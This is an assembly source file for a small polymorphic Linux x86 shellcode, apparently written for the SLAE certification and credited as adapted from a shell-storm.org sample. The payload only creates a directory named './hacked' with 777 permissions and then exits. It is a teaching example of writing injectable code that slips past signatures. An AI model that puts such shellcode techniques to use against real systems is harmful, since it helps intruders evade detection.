; http://shell-storm.org/shellcode/files/shellcode-542.php
; Polymorphic version modified by @davidlebr1 for SLAE certification - 28 bytes

global _start

_start:
	xor eax,eax
	push eax

	;sys mkdir
	mov al,0x27
	; push ./hacked
	push 0x64656b63
	push 0x61682f2e
	mov ebx,esp
	; push 777 which equal to 0x1ff in octal
	mov cx, 0x1ff
	int 0x80

	;sys exit
	push 0x1
	pop eax
	int 0x80